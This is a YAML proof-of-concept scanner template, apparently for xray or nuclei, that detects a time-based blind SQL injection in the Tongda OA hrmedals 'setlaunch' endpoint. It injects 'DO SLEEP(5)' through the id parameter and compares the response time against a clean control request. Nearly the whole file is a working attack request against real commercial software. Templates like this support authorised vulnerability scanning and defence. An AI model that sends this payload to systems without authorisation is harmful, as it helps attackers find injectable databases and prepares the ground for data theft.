name: poc-yaml-tongda-hrmedals-setlaunch-sqli
set:
  r1: randomLowercase(8)
  sleep_time: 5
groups:
  tongda:
    - method: POST
      path: /general/appbuilder/web/hr/hrmedals/setlaunch?id=1%3B%20DO%20SLEEP({{sleep_time}})%3B%20--%20-&is_launch=0&z=/appanonymousclient
      headers:
        Content-Type: application/x-www-form-urlencoded
        Upgrade-Insecure-Requests: "1"
        User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0"
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
        Accept-Encoding: "gzip, deflate, br"
        Accept-Language: "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6"
        Connection: "keep-alive"
      body: ""
      follow_redirects: false
      expression: >
        response.status == 200 && 
        response.duration >= sleep_time
    - method: POST
      path: /general/appbuilder/web/hr/hrmedals/setlaunch?id=1&is_launch=0&z=/appanonymousclient
      headers:
        Content-Type: application/x-www-form-urlencoded
        Upgrade-Insecure-Requests: "1"
        User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0"
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
        Accept-Encoding: "gzip, deflate, br"
        Accept-Language: "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6"
        Connection: "keep-alive"
      body: ""
      follow_redirects: false
      expression: >
        response.status == 200 && 
        response.duration < sleep_time
detail:
  author: L4xy
  description: "通达OA hrmedals setlaunch接口存在SQL注入漏洞，id参数存在时间盲注"
  links:
    - https://github.com/projectdiscovery/nuclei-templates/blob/main/http/vulnerabilities/tongda/
  tags: tongda,sqli,time-based